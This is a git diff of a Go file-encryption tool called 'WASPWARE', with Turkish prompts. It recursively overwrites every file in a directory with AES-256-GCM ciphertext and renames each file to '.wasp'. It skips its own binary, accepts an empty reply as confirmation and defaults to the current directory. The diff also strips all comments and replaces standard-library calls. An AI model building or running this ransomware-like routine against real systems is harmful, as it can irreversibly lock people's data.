@@ -11,14 +11,11 @@ import (
 	"io"
 	"os"
 	"path/filepath"
-	"strings"
 )
 
-// ============================================================================
-// KEY YÖNETİMİ
-// ============================================================================
+// Version - Versiyon bilgisi
+var Version = "1.0.0"
 
-// generateRandomBase64String - Rastgele Base64 string üretir
 func generateRandomBase64String(length int) (string, error) {
 	randomBytes := make([]byte, length)
 	_, err := rand.Read(randomBytes)
@@ -28,9 +25,8 @@ func generateRandomBase64String(length int) (string, error) {
 	return base64.StdEncoding.EncodeToString(randomBytes), nil
 }
 
-// createKey - Rastgele şifre anahtarı oluşturur
 func createKey() string {
-	keyLength := 32 // AES-256 için 32 byte (256 bit)
+	keyLength := 32
 	randomBase64String, err := generateRandomBase64String(keyLength)
 	if err != nil {
 		fmt.Println("Hata: Anahtar oluşturulurken hata oluştu:", err)
@@ -39,7 +35,19 @@ func createKey() string {
 	return randomBase64String
 }
 
-// askForKey - Kullanıcıdan şifre anahtarı alır
+func trimSpace(s string) string {
+	if len(s) == 0 {
+		return s
+	}
+	for len(s) > 0 && (s[0] == ' ' || s[0] == '\t' || s[0] == '\n' || s[0] == '\r') {
+		s = s[1:]
+	}
+	for len(s) > 0 && (s[len(s)-1] == ' ' || s[len(s)-1] == '\t' || s[len(s)-1] == '\n' || s[len(s)-1] == '\r') {
+		s = s[:len(s)-1]
+	}
+	return s
+}
+
 func askForKey() (string, error) {
 	reader := bufio.NewReader(os.Stdin)
 	fmt.Print("Şifreleme anahtarı giriniz: ")
@@ -47,10 +55,9 @@ func askForKey() (string, error) {
 	if err != nil {
 		return "", err
 	}
-	return strings.TrimSpace(key), nil
+	return trimSpace(key), nil
 }
 
-// askForDirectory - Kullanıcıdan hedef dizin alır
 func askForDirectory() (string, error) {
 	reader := bufio.NewReader(os.Stdin)
 	fmt.Print("Şifrelenmesi istenen dizini giriniz: ")
@@ -58,10 +65,9 @@ func askForDirectory() (string, error) {
 	if err != nil {
 		return "", err
 	}
-	return strings.TrimSpace(directory), nil
+	return trimSpace(directory), nil
 }
 
-// askForConfirmation - Kullanıcıdan onay alır
 func askForConfirmation(prompt string) (bool, error) {
 	reader := bufio.NewReader(os.Stdin)
 	fmt.Print(prompt)
@@ -69,9 +75,8 @@ func askForConfirmation(prompt string) (bool, error) {
 	if err != nil {
 		return false, err
 	}
-	input = strings.TrimSpace(input)
+	input = trimSpace(input)
 	if input == "" {
-		// Boş giriş ise onay olarak kabul et
 		return true, nil
 	}
 	if input == "y" || input == "Y" {
@@ -84,11 +89,6 @@ func askForConfirmation(prompt string) (bool, error) {
 	return askForConfirmation(prompt)
 }
 
-// ============================================================================
-// ŞİFRELEME MOTORU
-// ============================================================================
-
-// encryptAES - AES-256-GCM ile şifreleme yapar
 func encryptAES(plainText []byte, key []byte) ([]byte, error) {
 	block, err := aes.NewCipher(key)
 	if err != nil {
@@ -106,11 +106,8 @@ func encryptAES(plainText []byte, key []byte) ([]byte, error) {
 	return encryptedData, nil
 }
 
-// makeEncrypt - Dizindeki tüm dosyaları şifreler (kendi binary'sini dinamik olarak hariç tutar)
 func makeEncrypt(path string, key []byte) error {
-	// Programın kendi binary adını al (dinamik)
 	binaryName := filepath.Base(os.Args[0])
-	// Şifrelenmiş halini de hariç tut
 	binaryPattern := binaryName + ".wasp"
 
 	err := filepath.Walk(path, func(filePath string, info os.FileInfo, err error) error {
@@ -118,7 +115,6 @@ func makeEncrypt(path string, key []byte) error {
 			return err
 		}
 		if !info.IsDir() {
-			// Kendi binary'lerini şifreleme listesinden çıkar (dinamik)
 			if filePath == binaryName || filePath == binaryPattern {
 				fmt.Printf("  ℹ️  Kendi dosyası atlandı: %s\n", filePath)
 				return nil
@@ -127,12 +123,12 @@ func makeEncrypt(path string, key []byte) error {
 			content, err := os.ReadFile(filePath)
 			if err != nil {
 				fmt.Printf("  ⚠️  Dosya okuma hatası (%s): %v\n", filePath, err)
-				return nil // Hata ile devam et
+				return nil
 			}
 			encryptedContent, err := encryptAES(content, key)
 			if err != nil {
 				fmt.Printf("  ⚠️  Şifreleme hatası (%s): %v\n", filePath, err)
-				return nil // Hata ile devam et
+				return nil
 			}
 			err = os.WriteFile(filePath, encryptedContent, info.Mode())
 			if err != nil {
@@ -145,23 +141,17 @@ func makeEncrypt(path string, key []byte) error {
 	return err
 }
 
-// ============================================================================
-// UZANTI DEĞİŞTİRME
-// ============================================================================
-
-// changeExtensions - Şifrelenmiş dosyaların uzantısını .wasp olarak değiştirir
 func changeExtensions(path string) error {
 	err := filepath.Walk(path, func(filePath string, info os.FileInfo, err error) error {
 		if err != nil {
 			return err
 		}
 		if !info.IsDir() {
-			// Şifrelenmiş dosyaların uzantısını .wasp olarak değiştir
 			newPath := filePath + ".wasp"
 			err := os.Rename(filePath, newPath)
 			if err != nil {
 				fmt.Printf("  ⚠️  Uzantı değiştirme hatası (%s): %v\n", filePath, err)
-				return nil // Hata ile devam et
+				return nil
 			}
 			fmt.Printf("  ✓  %s -> %s\n", filePath, newPath)
 		}
@@ -170,27 +160,26 @@ func changeExtensions(path string) error {
 	return err
 }
 
-// ============================================================================
-// ANA FONKSİYONLAR
-// ============================================================================
+func repeatChar(c byte, n int) string {
+	s := ""
+	for i := 0; i < n; i++ {
+		s += string(c)
+	}
+	return s
+}
 
-// runEncryption - Şifreleme işlemini başlatır
 func runEncryption(key string, directory string) {
-	fmt.Println("\n" + strings.Repeat("=", 60))
+	fmt.Println("\n" + repeatChar('=', 60))
 	fmt.Println("🔐 WASPWARE - Dosya Şifreleme Aracı")
-	fmt.Println(strings.Repeat("=", 60))
-
-	// Anahtarı ekrana yazdır
+	fmt.Println(repeatChar('=', 60))
 	fmt.Printf("\n🔑 Şifreleme anahtarı: %s\n", key)
-	fmt.Println(strings.Repeat("-", 60))
+	fmt.Println(repeatChar('-', 60))
 
-	// Dizini kontrol et
 	if directory == "" {
 		fmt.Println("❌ Hata: Boş dizin!")
 		return
 	}
 
-	// Dizini doğrula
 	info, err := os.Stat(directory)
 	if err != nil {
 		fmt.Printf("❌ Hata: '%s' dizini bulunamadı!\n", directory)
@@ -202,15 +191,12 @@ func runEncryption(key string, directory string) {
 		return
 	}
 
-	// Şifreleme anahtarını 32 byte'a (AES-256 için) pad et
 	keyBytes := make([]byte, 32)
 	copy(keyBytes, []byte(key))
-	// Kalan boşlukları sıfırla (güvenlik için)
 	for i := len(key); i < 32; i++ {
 		keyBytes[i] = 0
 	}
 
-	// Şifreleme işlemini başlat
 	fmt.Printf("\n🚀 '%s' dizinindeki dosyalar şifreleniyor...\n\n", directory)
 
 	err = makeEncrypt(directory, keyBytes)
@@ -219,88 +205,66 @@ func runEncryption(key string, directory string) {
 		return
 	}
 
-	// Uzantıları değiştir
 	fmt.Println("\n🔄 Dosya uzantıları değiştiriliyor...")
 	err = changeExtensions(directory)
 	if err != nil {
 		fmt.Printf("⚠️  Uzantı değiştirme sırasında bazı hatalar: %v\n", err)
 	}
 
-	// Tamamlandı mesajı
-	fmt.Println("\n" + strings.Repeat("=", 60))
+	fmt.Println("\n" + repeatChar('=', 60))
 	fmt.Println("✅ ŞİFRELEME TAMAMLANDI!")
-	fmt.Println(strings.Repeat("=", 60))
+	fmt.Println(repeatChar('=', 60))
 	fmt.Printf("\n📁 Şifrelenmiş dosyalar: %s/\n", directory)
 	fmt.Println("💾 Dosyalar AES-256-GCM ile şifrelenmiştir.")
 	fmt.Println("🔑 Anahtarı güvenli bir yerde saklayınız!")
 	fmt.Println("\n💡 Terminal açık kalıyor. Ctrl+C ile çıkış yapabilirsiniz.")
-	fmt.Println(strings.Repeat("=", 60))
+	fmt.Println(repeatChar('=', 60))
 }
 
-// ============================================================================
-// MAIN FONKSİYONU
-// ============================================================================
-
 func main() {
-	// Flag tanımları (komut satırı argümanları için)
 	keyPtr := flag.String("key", "", "Şifreleme anahtarı (opsiyonel)")
 	dizinPtr := flag.String("dizin", "", "Hedef dizin (opsiyonel)")
 
 	flag.Parse()
 
-	// Eğer key veya dizin komut satırından verilmişse bunları kullan
 	if *keyPtr != "" && *dizinPtr != "" {
 		fmt.Printf("🔑 Komut satırı anahtarı kullanılıyor: %s\n", *keyPtr)
 		runEncryption(*keyPtr, *dizinPtr)
 		return
 	}
 
-	// Kullanıcı etkileşimli modu
-	fmt.Println("\n" + strings.Repeat("=", 60))
+	fmt.Println("\n" + repeatChar('=', 60))
 	fmt.Println("🔐 WASPWARE - Dosya Şifreleme Aracı")
-	fmt.Println(strings.Repeat("=", 60))
-	fmt.Println("\n📝 Bu araç AES-256-GCM şifreleme kullanır.")
+	fmt.Println(repeatChar('=', 60))
+	fmt.Println("\n📝 AES-256-GCM şifreleme kullanır.")
 	fmt.Println("📝 Tüm dosyalar .wasp uzantısına dönüştürülecektir.\n")
 
-	// 1. Build key alma (opsiyonel - random key üretebiliriz)
-	fmt.Println(strings.Repeat("-", 60))
-	fmt.Print("🔑 Şifreleme anahtarı giriniz (veya boş bırakarak random key üret): ")
+	fmt.Print("🔑 Şifreleme anahtarı (boş=random): ")
 	userKey, _ := askForKey()
 
-	// Eğer key boşsa random key üret
 	if userKey == "" {
-		fmt.Println("\n⚙️  Random anahtar üretiliyor...")
+		fmt.Println("\n⚙️  Random key üretiliyor...")
 		randomKey := createKey()
 		userKey = randomKey
-		fmt.Printf("🔑 Üretilen anahtar: %s\n", randomKey)
+		fmt.Printf("🔑 Anahtar: %s\n", randomKey)
 	} else {
-		fmt.Printf("🔑 Girilen anahtar: %s\n", userKey)
+		fmt.Printf("🔑 Anahtar: %s\n", userKey)
 	}
 
-	// 2. Onay alma
-	fmt.Println("\n" + strings.Repeat("-", 60))
-	fmt.Print("⚠️  Bu işlemi onaylıyor musunuz? (y/n): ")
+	fmt.Print("⚠️  Onaylıyor musunuz? (y/n): ")
 	confirmed, _ := askForConfirmation("Onaylıyor musunuz? ")
 
 	if !confirmed {
 		fmt.Println("\n❌ İşlem iptal edildi.")
-		fmt.Println("👋 Program kapanıyor...")
 		return
 	}
 
-	// 3. Hedef dizin alma (opsiyonel - boş bırakılabilir)
-	fmt.Println("\n" + strings.Repeat("-", 60))
-	fmt.Print("📁 Şifrelenmesi istenen dizini giriniz: ")
+	fmt.Print("📁 Hedef dizin: ")
 	directory, _ := askForDirectory()
 
-	// Eğer dizin boşsa, current directory kullan
 	if directory == "" {
 		directory = "."
-		fmt.Println("\n⚠️  Boş dizin girildi, current directory kullanılıyor.")
 	}
 
-	// 4. Şifreleme işlemini başlat
 	runEncryption(userKey, directory)
-
-	// Program açık kalır, kullanıcı Ctrl+C ile çıkış yapabilir
 }
